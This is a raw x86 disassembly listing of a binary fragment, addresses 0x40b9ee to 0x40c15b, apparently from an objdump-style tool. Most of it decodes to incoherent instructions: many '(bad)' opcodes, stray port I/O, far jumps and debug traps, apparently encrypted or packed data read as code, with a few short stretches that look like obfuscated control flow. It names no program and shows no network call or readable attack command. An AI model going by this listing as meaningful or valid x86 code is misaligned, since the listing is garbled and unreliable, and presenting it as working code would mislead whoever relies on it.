  40b9ee:	es out 0xfc,eax
  40b9f1:	ja     0x40b9c2
  40b9f3:	iret   
  40b9f4:	test   BYTE PTR [edx],ch
  40b9f6:	scas   eax,DWORD PTR es:[edi]
  40b9f7:	daa    
  40b9f8:	outs   dx,DWORD PTR ds:[esi]
  40b9f9:	mov    dh,0x53
  40b9fb:	xchg   esp,eax
  40b9fc:	repnz (bad) 
  40b9fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9ff:	cmp    al,0x62
  40ba01:	dec    esp
  40ba02:	xlat   BYTE PTR ds:[ebx]
  40ba03:	stos   DWORD PTR es:[edi],eax
  40ba04:	jp     0x40ba7b
  40ba06:	popa   
  40ba07:	lods   eax,DWORD PTR ds:[esi]
  40ba08:	scas   al,BYTE PTR es:[edi]
  40ba09:	enter  0x9d83,0xcb
  40ba0d:	pop    ecx
  40ba0e:	jg     0x40b9d5
  40ba10:	jle    0x40ba8d
  40ba12:	shl    BYTE PTR [edi-0x60d8c66d],cl
  40ba18:	aas    
  40ba19:	cmp    cl,dl
  40ba1b:	sbb    ecx,DWORD PTR [edi-0x65055ea9]
  40ba21:	add    dh,BYTE PTR [esi]
  40ba23:	shr    edx,1
  40ba25:	cmp    eax,0xcc6260e0
  40ba2a:	xchg   DWORD PTR [ebx+0x1],esi
  40ba2d:	mov    esp,0xf1db192f
  40ba32:	mov    ds:0xe951620f,eax
  40ba37:	xor    DWORD PTR [ebx+0xf4e40f8],edi
  40ba3d:	shl    BYTE PTR [eax+ecx*2],1
  40ba40:	pop    ds
  40ba41:	cmp    DWORD PTR [ecx],edi
  40ba43:	pop    edx
  40ba44:	int3   
  40ba45:	inc    edi
  40ba46:	sub    ecx,DWORD PTR [ebp-0x6f2e87ad]
  40ba4c:	aas    
  40ba4d:	or     eax,0x570f192f
  40ba52:	inc    esi
  40ba53:	sub    ecx,DWORD PTR [edi+0x268751d0]
  40ba59:	adc    ebp,DWORD PTR [edx+0x7a]
  40ba5c:	iret   
  40ba5d:	cmp    ecx,DWORD PTR [edx+0x76]
  40ba60:	ret    0xf98f
  40ba63:	mov    eax,ds:0xfb7b743
  40ba68:	frstor [edi]
  40ba6a:	add    bh,0x9c
  40ba6d:	outs   dx,DWORD PTR ds:[esi]
  40ba6e:	in     al,0x40
  40ba70:	xchg   esi,eax
  40ba71:	mov    bl,0xd0
  40ba73:	sbb    esp,edi
  40ba75:	mov    esi,0xa468422e
  40ba7a:	int3   
  40ba7b:	fdivr  DWORD PTR [ecx+0x693666da]
  40ba81:	test   DWORD PTR [esi+0x2d5d3825],ecx
  40ba87:	dec    eax
  40ba88:	xchg   esp,eax
  40ba89:	inc    ebp
  40ba8a:	jae    0x40baaa
  40ba8c:	cmc    
  40ba8d:	sub    eax,0x4ae4cb56
  40ba92:	or     ah,BYTE PTR [esi+esi*8]
  40ba95:	dec    eax
  40ba96:	xor    eax,0xdd795fb
  40ba9b:	loopne 0x40bae5
  40ba9d:	mov    es,WORD PTR [eax-0x603fbc80]
  40baa3:	mov    BYTE PTR [ebx+0x7d8bc455],cl
  40baa9:	cld    
  40baaa:	xor    edi,eax
  40baac:	xor    edx,eax
  40baae:	add    edi,ecx
  40bab0:	add    edx,ecx
  40bab2:	imul   edx,edi
  40bab5:	mov    DWORD PTR [ebp+0xc],edx
  40bab8:	mov    edx,DWORD PTR [ebp+0xc]
  40babb:	jmp    0x40be2e
  40bac0:	cmp    BYTE PTR ds:0x766dac5b,ch
  40bac6:	retf   
  40bac7:	jge    0x40bac8
  40bac9:	dec    ebx
  40baca:	jo     0x40baa5
  40bacc:	cdq    
  40bacd:	sahf   
  40bace:	mov    ch,0x6f
  40bad0:	xchg   ebp,eax
  40bad1:	cmp    DWORD PTR [esp+edi*2-0x36],0x79
  40bad6:	jl     0x40bb54
  40bad8:	ja     0x40ba68
  40bada:	leave  
  40badb:	jg     0x40badc
  40badd:	pop    ebx
  40bade:	or     eax,0x6a8e6ce4
  40bae3:	adc    BYTE PTR [eax+ebx*4],dl
  40bae6:	dec    eax
  40bae7:	and    esp,DWORD PTR [esi]
  40bae9:	add    al,0x20
  40baeb:	lods   al,BYTE PTR ds:[esi]
  40baec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baed:	or     eax,0x18649e96
  40baf2:	mov    eax,ds:0x63e8c995
  40baf7:	test   ebx,0xe5051758
  40bafd:	or     esp,DWORD PTR [ecx+esi*1-0x3c67fec7]
  40bb04:	push   ds
  40bb05:	sub    ch,al
  40bb07:	and    BYTE PTR [eax+edi*1+0x75],dh
  40bb0b:	or     eax,DWORD PTR [eax-0x77]
  40bb0e:	cld    
  40bb0f:	stos   DWORD PTR es:[edi],eax
  40bb10:	lds    ebp,FWORD PTR [edi]
  40bb12:	retf   
  40bb13:	ja     0x40bac0
  40bb15:	mov    ebx,0xa635d7e8
  40bb1a:	mov    ebx,0xa03cf3a3
  40bb1f:	and    BYTE PTR [ebp-0x5532350],0x1d
  40bb26:	lock cwde 
  40bb28:	test   eax,0x92c3018d
  40bb2d:	cs aaa 
  40bb2f:	push   ss
  40bb30:	popf   
  40bb31:	push   cs
  40bb32:	pop    esi
  40bb33:	jl     0x40bad4
  40bb35:	fstp   QWORD PTR [edi+edi*8]
  40bb38:	sub    al,0x0
  40bb3a:	jb     0x40baf3
  40bb3c:	daa    
  40bb3d:	ret    0x6e90
  40bb40:	out    dx,al
  40bb41:	(bad)  
  40bb42:	and    eax,0x81641eda
  40bb47:	mov    ch,0xfa
  40bb49:	dec    eax
  40bb4a:	jle    0x40bbad
  40bb4c:	popa   
  40bb4d:	stos   BYTE PTR es:[edi],al
  40bb4e:	pop    edi
  40bb4f:	cli    
  40bb50:	jmp    0x2203:0xb974c611
  40bb57:	mov    al,0x32
  40bb59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb5a:	cmp    eax,0x70827a7
  40bb5f:	adc    BYTE PTR [edx+ebx*2-0x22f68fdf],al
  40bb66:	dec    esp
  40bb67:	mov    WORD PTR [eax],es
  40bb69:	pop    ebp
  40bb6a:	loop   0x40baf6
  40bb6c:	icebp  
  40bb6d:	fwait
  40bb6e:	enter  0xfab9,0x92
  40bb72:	shl    dl,0x60
  40bb75:	sysenter 
  40bb77:	push   ebp
  40bb78:	xor    BYTE PTR [eax+ecx*4],dl
  40bb7b:	gs jbe 0x40bbcc
  40bb7e:	stos   DWORD PTR es:[edi],eax
  40bb7f:	scas   eax,DWORD PTR es:[edi]
  40bb80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb81:	fidiv  DWORD PTR [edx-0x19ae094a]
  40bb87:	jo     0x40bb80
  40bb89:	sbb    eax,0x28816414
  40bb8e:	idiv   BYTE PTR [ebx]
  40bb90:	in     eax,0x99
  40bb92:	pop    edx
  40bb93:	mov    ebx,0xe7df75d4
  40bb98:	ss scas al,BYTE PTR es:[edi]
  40bb9a:	gs add ah,ah
  40bb9d:	mov    ds:0xb0546b24,eax
  40bba2:	popa   
  40bba3:	cld    
  40bba4:	repz in eax,0xa3
  40bba7:	in     al,dx
  40bba8:	in     eax,0x61
  40bbaa:	and    dl,BYTE PTR [eax+0x2dff52fe]
  40bbb0:	icebp  
  40bbb1:	ret    
  40bbb2:	cli    
  40bbb3:	fmulp  st(0),st
  40bbb5:	mov    ebp,0xad33fbe3
  40bbba:	mov    ebx,0x74ff985e
  40bbbf:	add    esi,DWORD PTR [ecx-0x3090850d]
  40bbc5:	adc    BYTE PTR [ecx+0x47ed795b],al
  40bbcb:	sbb    eax,0x4c45ed7e
  40bbd0:	popa   
  40bbd1:	ret    0x8ea4
  40bbd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbd5:	push   ss
  40bbd6:	loope  0x40bb5b
  40bbd8:	sahf   
  40bbd9:	sub    cl,0xae
  40bbdc:	and    edi,ebp
  40bbde:	scas   al,BYTE PTR es:[edi]
  40bbdf:	adc    ebp,edi
  40bbe1:	push   edi
  40bbe2:	adc    eax,0x2da0ef8f
  40bbe7:	xchg   ecx,eax
  40bbe8:	(bad)  
  40bbe9:	les    esp,FWORD PTR [ebx-0x3e]
  40bbec:	stos   DWORD PTR es:[edi],eax
  40bbed:	(bad)  
  40bbf0:	inc    esp
  40bbf1:	outs   dx,DWORD PTR ds:[esi]
  40bbf2:	mov    edi,?
  40bbf4:	jge    0x40bc31
  40bbf6:	jle    0x40bbc0
  40bbf8:	or     BYTE PTR [ecx+0x6f],0xb6
  40bbfc:	inc    edx
  40bbfd:	fsubr  st(0),st
  40bbff:	push   esi
  40bc00:	imul   BYTE PTR [edi-0x7c]
  40bc03:	js     0x40bc1d
  40bc05:	dec    edx
  40bc06:	push   cs
  40bc07:	sub    ah,cl
  40bc09:	fdiv   QWORD PTR [edx+0x4f218730]
  40bc0f:	lods   al,BYTE PTR ds:[esi]
  40bc10:	adc    ch,BYTE PTR [esi]
  40bc12:	inc    esp
  40bc13:	dec    esi
  40bc14:	mov    ah,0x66
  40bc16:	adc    eax,0x56669f1b
  40bc1b:	es pop ecx
  40bc1d:	out    0x4e,al
  40bc1f:	jp     0x40bc71
  40bc21:	ds push ebx
  40bc23:	or     esp,ecx
  40bc25:	xor    edi,DWORD PTR [eax-0x6c1a57ed]
  40bc2b:	push   esi
  40bc2c:	push   esp
  40bc2d:	mov    dh,0x94
  40bc2f:	push   eax
  40bc30:	ds loop 0x40bc14
  40bc33:	packuswb mm3,QWORD PTR [ecx]
  40bc36:	cmp    dh,ah
  40bc38:	in     al,0x49
  40bc3a:	push   ebp
  40bc3b:	mov    dl,0x30
  40bc3d:	mov    esp,0x71353f9e
  40bc42:	dec    eax
  40bc43:	pusha  
  40bc44:	leave  
  40bc45:	mov    eax,ds:0x9aea3de7
  40bc4a:	lods   eax,DWORD PTR ds:[esi]
  40bc4b:	jp     0x40bc7b
  40bc4d:	popf   
  40bc4e:	mov    BYTE PTR [edi+edx*1+0x6b918d20],0x96
  40bc56:	leave  
  40bc57:	ret    0x83da
  40bc5a:	fiadd  DWORD PTR [eax+0x128ff43e]
  40bc60:	stos   DWORD PTR es:[edi],eax
  40bc61:	inc    esi
  40bc62:	jne    0x40bc86
  40bc64:	lea    edi,[eax-0x5d5ac0da]
  40bc6a:	repz mov bh,0x96
  40bc6d:	sbb    edi,0x97a600a8
  40bc73:	lds    ecx,FWORD PTR [ebx-0x31]
  40bc76:	mov    esp,0xe220d682
  40bc7b:	dec    ebx
  40bc7c:	add    ch,bh
  40bc7e:	pop    edx
  40bc7f:	jmp    0x9b7fec19
  40bc84:	add    al,0x19
  40bc86:	adc    BYTE PTR [ebx],dh
  40bc88:	bound  edi,QWORD PTR [eax-0x5b]
  40bc8b:	or     edi,DWORD PTR [esp+edi*8]
  40bc8e:	mov    ecx,DWORD PTR es:0xce415622
  40bc95:	inc    esp
  40bc96:	dec    esi
  40bc97:	test   eax,0xce46c636
  40bc9c:	ss adc eax,esi
  40bc9f:	sbb    al,0x5d
  40bca1:	pop    ebp
  40bca2:	lock mov eax,ds:0xf2cdb293
  40bca8:	dec    BYTE PTR [ebx]
  40bcaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcab:	cld    
  40bcac:	mov    esi,0x8bdf8b84
  40bcb1:	mov    edx,0xf28459bf
  40bcb6:	dec    ecx
  40bcb7:	jno    0x40bcae
  40bcb9:	cmp    eax,0x57c5def6
  40bcbe:	sbb    al,0x1
  40bcc0:	add    eax,0x951647b6
  40bcc5:	ret    
  40bcc6:	or     bl,BYTE PTR [ecx+eiz*8-0x34a995c3]
  40bccd:	scas   eax,DWORD PTR es:[edi]
  40bcce:	inc    eax
  40bccf:	jmp    0x40bc86
  40bcd1:	pop    ds
  40bcd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcd3:	ins    BYTE PTR es:[edi],dx
  40bcd4:	jae    0x40bcd6
  40bcd6:	jne    0x40bcdd
  40bcd8:	lods   eax,DWORD PTR ds:[esi]
  40bcd9:	sub    bl,BYTE PTR [ecx+0x11d9b84d]
  40bcdf:	leave  
  40bce0:	add    ah,bl
  40bce2:	loope  0x40bd0a
  40bce4:	mov    DWORD PTR [eax],ebp
  40bce6:	fld    TBYTE PTR [edx-0x20a57b94]
  40bcec:	jl     0x40bd05
  40bcee:	iret   
  40bcef:	push   ss
  40bcf0:	or     ah,BYTE PTR [eax+0x46185ac6]
  40bcf6:	xlat   BYTE PTR ds:[ebx]
  40bcf7:	jo     0x40bd4f
  40bcf9:	adc    eax,0x2e07d8a
  40bcfe:	outs   dx,DWORD PTR ds:[esi]
  40bcff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd00:	test   cl,ch
  40bd02:	inc    ebx
  40bd03:	loop   0x40bd72
  40bd05:	arpl   WORD PTR [esi-0x558ccea3],si
  40bd0b:	xor    eax,0x7c8cbaec
  40bd10:	cwde   
  40bd11:	push   edi
  40bd12:	sub    DWORD PTR [eax],ecx
  40bd14:	mov    ds:0xcde70c03,al
  40bd19:	or     al,0x5f
  40bd1b:	jmp    0xd78a:0xbd1a017a
  40bd22:	or     bl,bl
  40bd24:	sub    BYTE PTR [edi],0x5a
  40bd27:	icebp  
  40bd28:	inc    edi
  40bd29:	in     al,0x99
  40bd2b:	dec    esp
  40bd2c:	test   al,0x5
  40bd2e:	clc    
  40bd2f:	loop   0x40bcee
  40bd31:	cdq    
  40bd32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd33:	sbb    bh,al
  40bd35:	xor    BYTE PTR [esi+0x1a989e82],cl
  40bd3b:	fistp  QWORD PTR [ebx]
  40bd3d:	jno    0x40bd44
  40bd3f:	push   esp
  40bd40:	dec    eax
  40bd41:	adc    edx,esp
  40bd43:	outs   dx,DWORD PTR ds:[esi]
  40bd44:	push   0xffffffd1
  40bd46:	sbb    BYTE PTR [edi-0x27],0x82
  40bd4a:	push   ds
  40bd4b:	psrad  mm0,QWORD PTR [ecx]
  40bd4e:	inc    esp
  40bd4f:	jl     0x40bd91
  40bd51:	jne    0x40bd30
  40bd53:	and    al,0xa6
  40bd55:	cwde   
  40bd56:	adc    BYTE PTR [eax],cl
  40bd58:	jmp    0x64247f93
  40bd5d:	dec    eax
  40bd5e:	enter  0x48cc,0xd5
  40bd62:	pushf  
  40bd63:	adc    bl,0x36
  40bd66:	nop
  40bd67:	cmp    eax,0x8e6e5732
  40bd6c:	xlat   BYTE PTR ds:[ebx]
  40bd6d:	add    BYTE PTR [ebx],dl
  40bd6f:	dec    edi
  40bd70:	shr    BYTE PTR [edx-0x3b7f2a7c],1
  40bd76:	les    eax,FWORD PTR [ebx+0x59e27cbe]
  40bd7c:	popf   
  40bd7d:	cmp    BYTE PTR [esi+0x679d3bf7],cl
  40bd83:	aam    0x0
  40bd85:	cmp    al,0xf5
  40bd87:	ficomp DWORD PTR [edx+0x20]
  40bd8a:	scas   eax,DWORD PTR es:[edi]
  40bd8b:	das    
  40bd8c:	fisttp WORD PTR [esp+ecx*4-0x59fe5065]
  40bd93:	std    
  40bd94:	hlt    
  40bd95:	sub    eax,0xc875cdfc
  40bd9a:	pop    edi
  40bd9b:	icebp  
  40bd9c:	mov    eax,DWORD PTR [eax-0x42030a5e]
  40bda2:	mov    dh,0x4b
  40bda4:	sahf   
  40bda5:	out    dx,eax
  40bda6:	xor    DWORD PTR [ebp+0x3c],edi
  40bda9:	and    bh,bh
  40bdab:	jecxz  0x40bd5d
  40bdad:	mov    esi,0xd4a56ce9
  40bdb2:	push   ss
  40bdb3:	dec    esp
  40bdb4:	xor    DWORD PTR [ebp+0x2a0a9827],0xbe358056
  40bdbe:	imul   eax,DWORD PTR [edx],0x587c9c0e
  40bdc4:	lods   eax,DWORD PTR ds:[esi]
  40bdc5:	sbb    al,0x9a
  40bdc7:	dec    edi
  40bdc8:	popf   
  40bdc9:	in     al,0xe3
  40bdcb:	test   BYTE PTR [eax-0x4f0325fb],cl
  40bdd1:	pop    esi
  40bdd2:	dec    ebx
  40bdd3:	mov    ebp,0xac0b6844
  40bdd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdd9:	mov    esp,0xa16a0a42
  40bdde:	fisubr WORD PTR [eax]
  40bde0:	fst    DWORD PTR [ecx+0x74]
  40bde3:	les    ecx,FWORD PTR [eax-0x5d]
  40bde6:	cli    
  40bde7:	popf   
  40bde8:	out    dx,eax
  40bde9:	lods   eax,DWORD PTR ds:[esi]
  40bdea:	(bad)  [edx-0x57e011bf]
  40bdf0:	adc    ch,ch
  40bdf2:	inc    esi
  40bdf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdf4:	jecxz  0x40be70
  40bdf6:	jmp    0x9991:0xbbdbb03
  40bdfd:	bound  esp,QWORD PTR [esi]
  40bdff:	test   eax,0xf3891723
  40be04:	out    dx,al
  40be05:	sti    
  40be06:	fadd   DWORD PTR [ecx-0x61caa2e6]
  40be0c:	xchg   ecx,eax
  40be0d:	inc    esp
  40be0e:	and    eax,0xebb40ede
  40be13:	xor    esp,0xc
  40be16:	loope  0x40be60
  40be18:	repz enter 0x849b,0x81
  40be1d:	dec    DWORD PTR [ebx-0x28ccba5e]
  40be23:	pop    esi
  40be24:	add    DWORD PTR [edi-0x80b7c64],eax
  40be2a:	iret   
  40be2b:	outs   dx,BYTE PTR ds:[esi]
  40be2c:	out    dx,al
  40be2d:	or     DWORD PTR [ecx+0x558bdc55],0xfffffff8
  40be34:	add    edx,DWORD PTR [ebp-0x40]
  40be37:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40be3e:	mov    DWORD PTR [ebp-0x1c],edx
  40be41:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  40be48:	mov    DWORD PTR [ebp-0x44],0xf89c853b
  40be4f:	mov    edx,DWORD PTR [ebp-0x18]
  40be52:	xor    edx,eax
  40be54:	jmp    0x40c1c7
  40be59:	adc    eax,edx
  40be5b:	mov    bl,0x4c
  40be5d:	jge    0x40bec8
  40be5f:	repz dec ebp
  40be61:	push   ebp
  40be62:	add    ecx,DWORD PTR [ebx+ebx*4]
  40be65:	nop
  40be66:	mov    ecx,ebp
  40be68:	sbb    eax,0x7c7c8c63
  40be6d:	retf   0x7c79
  40be70:	jl     0x40be91
  40be72:	les    ebp,FWORD PTR [ebx]
  40be74:	mov    ch,0x27
  40be76:	xor    esp,DWORD PTR [eax+0x4ef875a5]
  40be7c:	xor    BYTE PTR [ecx],0x82
  40be7f:	adc    eax,0x729dc284
  40be84:	jno    0x40bf05
  40be86:	cmc    
  40be87:	pop    ebp
  40be88:	out    dx,al
  40be89:	lea    edx,[eax]
  40be8b:	mov    al,0x2
  40be8d:	cmp    eax,0x21ebd2b8
  40be92:	lahf   
  40be93:	stos   DWORD PTR es:[edi],eax
  40be94:	and    eax,0xb882bafb
  40be99:	jo     0x40be98
  40be9b:	push   ss
  40be9c:	shr    ah,0x0
  40be9f:	(bad)  
  40bea1:	popf   
  40bea2:	call   0x11884dc1
  40bea7:	adc    DWORD PTR [edx-0x43c38553],esi
  40bead:	sbb    eax,0xca127ca7
  40beb2:	ret    0x4fce
  40beb5:	jle    0x40becd
  40beb7:	inc    edi
  40beb8:	push   ds
  40beb9:	js     0x40be44
  40bebb:	xor    BYTE PTR [ebx+edx*8-0x32e23d77],dl
  40bec2:	and    al,0xe9
  40bec4:	mov    db0,esp
  40bec7:	xor    eax,0x9cff6b4a
  40becc:	mov    al,ds:0xd950ea9a
  40bed1:	ds or  bl,ah
  40bed4:	lea    edi,[ebp-0x2a]
  40bed7:	fist   WORD PTR [ebx+ebx*8]
  40beda:	jp     0x40be77
  40bedc:	cmc    
  40bedd:	jg     0x40bedf
  40bedf:	not    edi
  40bee1:	popf   
  40bee2:	xor    DWORD PTR [ebp+0x49eba50d],0xffffffd8
  40bee9:	adc    eax,0x2ea4b73b
  40beee:	jmp    0x40bf15
  40bef0:	cmp    al,BYTE PTR [ebx]
  40bef2:	mov    ch,0x18
  40bef4:	jge    0x40beea
  40bef6:	push   0xfffffffd
  40bef8:	pop    eax
  40bef9:	or     eax,0xd634787f
  40befe:	test   eax,0xe5666825
  40bf03:	mov    edx,0x28f2e1db
  40bf08:	adc    BYTE PTR [ecx-0xfb7f27f],al
  40bf0e:	jecxz  0x40beb0
  40bf10:	mov    esi,0xf5508491
  40bf15:	push   eax
  40bf16:	fnstenv [edi-0x5b]
  40bf19:	mov    eax,0xfa2c74d1
  40bf1e:	xor    ah,BYTE PTR [ebx-0x4f]
  40bf21:	sub    bh,dl
  40bf23:	test   eax,0x8787e0f0
  40bf28:	pop    esp
  40bf29:	xchg   esp,eax
  40bf2a:	pusha  
  40bf2b:	jno    0x40bf4d
  40bf2d:	xchg   edx,eax
  40bf2e:	adc    BYTE PTR [edx+edi*4+0x4e],bl
  40bf32:	in     al,0x31
  40bf34:	or     edi,esi
  40bf36:	adc    DWORD PTR [edx-0x104471ad],esp
  40bf3c:	push   0x2a
  40bf3e:	fcom   DWORD PTR ds:0x3287c171
  40bf44:	sbb    edx,DWORD PTR [ebx]
  40bf46:	test   DWORD PTR [edi],0x528a3d01
  40bf4c:	icebp  
  40bf4d:	xchg   edx,eax
  40bf4e:	pop    ds
  40bf4f:	inc    esi
  40bf50:	jbe    0x40bf3a
  40bf52:	test   BYTE PTR [esi],bl
  40bf54:	or     bl,BYTE PTR gs:[edx]
  40bf57:	cdq    
  40bf58:	imul   eax,DWORD PTR [ecx],0xb7287f9e
  40bf5e:	jae    0x40bf62
  40bf60:	and    DWORD PTR [edx-0x7cfc1755],edx
  40bf66:	popa   
  40bf67:	xchg   edi,eax
  40bf68:	ja     0x40bf5a
  40bf6a:	popa   
  40bf6b:	std    
  40bf6c:	sbb    ecx,DWORD PTR [edi+eiz*2-0x54]
  40bf70:	(bad)  [esi+0x71]
  40bf73:	(bad)  
  40bf74:	arpl   bp,sp
  40bf76:	in     eax,dx
  40bf77:	mov    bl,0xb1
  40bf79:	leave  
  40bf7a:	retf   0x1ca4
  40bf7d:	jae    0x40bfe4
  40bf7f:	mov    ah,0x90
  40bf81:	ds in  eax,dx
  40bf83:	call   FWORD PTR [ecx-0x5]
  40bf86:	stos   DWORD PTR es:[edi],eax
  40bf87:	cs stos DWORD PTR es:[edi],eax
  40bf89:	xlat   BYTE PTR ds:[ebx]
  40bf8a:	add    eax,0x5eb5c3e7
  40bf8f:	pop    esp
  40bf90:	add    al,BYTE PTR [edi+0x63423866]
  40bf96:	(bad)  
  40bf97:	fiadd  DWORD PTR [eax+0x2c]
  40bf9a:	loopne 0x40bfd5
  40bf9c:	inc    eax
  40bf9d:	ss mov ebx,0x785a55eb
  40bfa3:	push   esp
  40bfa4:	fdiv   QWORD PTR [edx+ecx*1-0x1f]
  40bfa8:	push   ebx
  40bfa9:	sbb    DWORD PTR [ebx+0x6558cb8f],esi
  40bfaf:	out    dx,al
  40bfb0:	cmp    dh,cl
  40bfb2:	mul    DWORD PTR [edx]
  40bfb4:	mov    dh,0x6c
  40bfb6:	jbe    0x40bf65
  40bfb8:	and    esi,0xffffffe9
  40bfbb:	mul    BYTE PTR [edx+0x591988a4]
  40bfc1:	loop   0x40bf9b
  40bfc3:	push   eax
  40bfc4:	push   ecx
  40bfc5:	cwde   
  40bfc6:	out    0x31,eax
  40bfc8:	jmp    0x40bf73
  40bfca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfcb:	lds    edi,FWORD PTR [edi-0x65]
  40bfce:	in     eax,dx
  40bfcf:	ror    BYTE PTR [ecx+0x51],0x41
  40bfd3:	icebp  
  40bfd4:	mov    esi,gs
  40bfd6:	inc    eax
  40bfd7:	mov    ah,0x33
  40bfd9:	sub    al,ch
  40bfdb:	std    
  40bfdc:	mov    esp,0xf5587b97
  40bfe1:	in     al,0xb4
  40bfe3:	adc    eax,0xc5c3c5d6
  40bfe8:	push   edx
  40bfe9:	xchg   BYTE PTR [ecx-0x6ed82835],ch
  40bfef:	mov    ch,0x1f
  40bff1:	jle    0x40c057
  40bff3:	mov    edx,0x41ecc959
  40bff8:	mov    edi,0x7ebb5f8f
  40bffd:	(bad)  
  40bffe:	push   ebx
  40bfff:	push   edi
  40c000:	pusha  
  40c001:	sti    
  40c002:	push   cs
  40c003:	sub    ebx,DWORD PTR [edi-0x6f6411d8]
  40c009:	push   es
  40c00a:	and    cl,BYTE PTR [ecx-0x67ff624e]
  40c010:	adc    BYTE PTR [ecx+0x5c],ch
  40c013:	test   BYTE PTR [edx+0x2c7f4b96],ch
  40c019:	cdq    
  40c01a:	outs   dx,DWORD PTR ds:[esi]
  40c01b:	fild   WORD PTR [ecx+0x5c]
  40c01e:	add    al,0x28
  40c021:	jns    0x40c074
  40c023:	and    al,0xd3
  40c025:	loop   0x40c035
  40c027:	icebp  
  40c028:	in     eax,dx
  40c029:	xchg   esp,eax
  40c02a:	cmc    
  40c02b:	inc    bl
  40c02d:	xchg   ebx,eax
  40c02e:	retf   0x57ea
  40c031:	mov    al,ds:0x79046852
  40c036:	adc    eax,0x4b2b8d3c
  40c03b:	fistp  DWORD PTR [esi+0x1c]
  40c03e:	fld    DWORD PTR [ebx+0x69a3ca5a]
  40c044:	pop    ecx
  40c045:	lods   al,BYTE PTR ds:[esi]
  40c046:	mov    ch,0x35
  40c048:	jmp    0x8758:0x8320d8d8
  40c04f:	jg     0x40c038
  40c051:	or     cl,BYTE PTR [esi-0x22c47f39]
  40c057:	bound  ebx,QWORD PTR [ecx+0x43d0a3c1]
  40c05d:	(bad)  
  40c05f:	nop
  40c060:	shl    BYTE PTR [edx+0x414b50a],1
  40c066:	cs dec ebx
  40c068:	mov    es,WORD PTR [edx-0x57]
  40c06b:	cmp    ch,BYTE PTR [ebx-0x1c]
  40c06e:	mov    eax,0xa081ab9f
  40c073:	ja     0x40c021
  40c075:	fldz   
  40c077:	lahf   
  40c078:	pop    es
  40c079:	fnstenv [ecx]
  40c07b:	jmp    ebp
  40c07d:	pop    ecx
  40c07e:	in     eax,0x12
  40c080:	pop    ebx
  40c081:	xchg   ecx,eax
  40c082:	jp     0x40c0f3
  40c084:	ss inc ebp
  40c086:	cmp    BYTE PTR [edx-0x22],cl
  40c089:	loop   0x40c064
  40c08b:	mov    dh,0x62
  40c08d:	fcomp  st(5)
  40c08f:	enter  0x5c03,0x8d
  40c093:	add    eax,edi
  40c095:	push   es
  40c096:	ret    
  40c097:	adc    al,0xbf
  40c099:	mov    ds:0x48f490dc,eax
  40c09e:	and    al,BYTE PTR [ecx+0x4]
  40c0a1:	into   
  40c0a2:	(bad)  
  40c0a4:	stc    
  40c0a5:	fdivr  DWORD PTR [edi]
  40c0a7:	dec    eax
  40c0a8:	push   cs
  40c0a9:	repz jbe 0x40c0ed
  40c0ac:	call   0x3821:0xa72167a8
  40c0b3:	repnz mov BYTE PTR [esi],cl
  40c0b6:	ret    
  40c0b7:	xlat   BYTE PTR ds:[ebx]
  40c0b8:	inc    eax
  40c0b9:	xor    al,0x4b
  40c0bb:	je     0x40c049
  40c0bd:	or     DWORD PTR [esi-0x44d21a61],0x32
  40c0c4:	pop    edi
  40c0c5:	lods   al,BYTE PTR ds:[esi]
  40c0c6:	pop    fs
  40c0c8:	or     BYTE PTR [esi],0xaf
  40c0cb:	imul   esi,DWORD PTR [ecx],0xffffffdc
  40c0ce:	cmp    DWORD PTR [esi+0x56],0x96bc9923
  40c0d5:	enter  0xe365,0xd1
  40c0d9:	xchg   ebp,eax
  40c0da:	mov    dl,0xf8
  40c0dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0dd:	pop    ebp
  40c0de:	push   ecx
  40c0df:	push   esi
  40c0e0:	jmp    0x40c089
  40c0e2:	imul   ebp,DWORD PTR [edx-0x4c],0xd9a9bf51
  40c0e9:	push   edi
  40c0ea:	loop   0x40c104
  40c0ec:	retf   0xae15
  40c0ef:	and    BYTE PTR [eax-0x19],dh
  40c0f2:	mov    ebx,0x4a35415e
  40c0f7:	repnz lea ebx,[ebp+0x7f49a847]
  40c0fe:	leave  
  40c0ff:	sub    BYTE PTR [edx-0x33],0xbe
  40c103:	(bad)  
  40c104:	jnp    0x40c09c
  40c106:	cwde   
  40c107:	das    
  40c108:	lods   eax,DWORD PTR ds:[esi]
  40c109:	out    0xd0,al
  40c10b:	data16 lods al,BYTE PTR cs:[esi]
  40c10e:	adc    eax,0xb1d9e55f
  40c113:	int    0x68
  40c115:	push   esp
  40c116:	push   esp
  40c117:	mov    al,ds:0x76918a51
  40c11c:	repz pusha 
  40c11e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c11f:	sub    al,0x3e
  40c121:	dec    esi
  40c122:	lods   al,BYTE PTR ds:[esi]
  40c123:	cli    
  40c124:	and    ebp,DWORD PTR [ebp+0x49]
  40c127:	es xchg ecx,eax
  40c129:	rcl    BYTE PTR [esi+ebp*2+0x758829f9],1
  40c130:	inc    esp
  40c131:	icebp  
  40c132:	pand   mm7,mm5
  40c135:	sub    cl,BYTE PTR ds:[edi+0x5500b408]
  40c13c:	mov    ?,WORD PTR [esi+0x3064f40a]
  40c142:	push   cs
  40c143:	nop
  40c144:	xlat   BYTE PTR ds:[ebx]
  40c145:	jo     0x40c103
  40c147:	stos   DWORD PTR es:[edi],eax
  40c148:	sub    al,0xbf
  40c14a:	nop
  40c14b:	push   ecx
  40c14c:	or     BYTE PTR [ebx-0x80],ah
  40c14f:	mov    ebp,DWORD PTR [edi]
  40c151:	out    dx,eax
  40c152:	popf   
  40c153:	inc    ebp
  40c154:	xchg   ah,dh
  40c156:	cdq    
  40c157:	mov    dl,0x62
  40c159:	cmp    al,0xb8
  40c15b:	cld    
